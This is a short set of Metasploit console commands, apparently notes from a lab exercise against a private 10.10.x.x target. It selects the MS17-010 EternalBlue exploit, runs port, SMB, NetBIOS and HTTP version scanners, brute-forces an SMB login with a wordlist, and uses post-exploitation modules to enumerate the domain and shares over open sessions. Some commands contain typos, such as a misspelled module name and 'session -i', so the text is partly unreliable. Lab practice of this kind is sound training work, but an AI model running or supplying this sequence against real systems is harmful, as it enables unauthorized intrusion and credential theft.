# select exploit

use exploit/windows/smb/ms17_010_eternalblue

# set

setg rhosts 10.10.148.128
use auxiliary/scanner/portscan/tcp
run

search smb_version
use auxiliary/scanner/smb/smb_version
run

search netbios
use auxiliary/scanner/netbios/nbname
run

search http_version
show options
setg rport 8000
use auxiliary/scanner/http/http_version
run

search smb_login
show options
set rport 445
setg SMBUser testuser
setg PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
run

# enum domain name

Use post/windows/gather/enum_domain
show options
session -i

session -i 1
run

# search enum

search enu_share
use 0
show options
sessions -l
set session 2
run
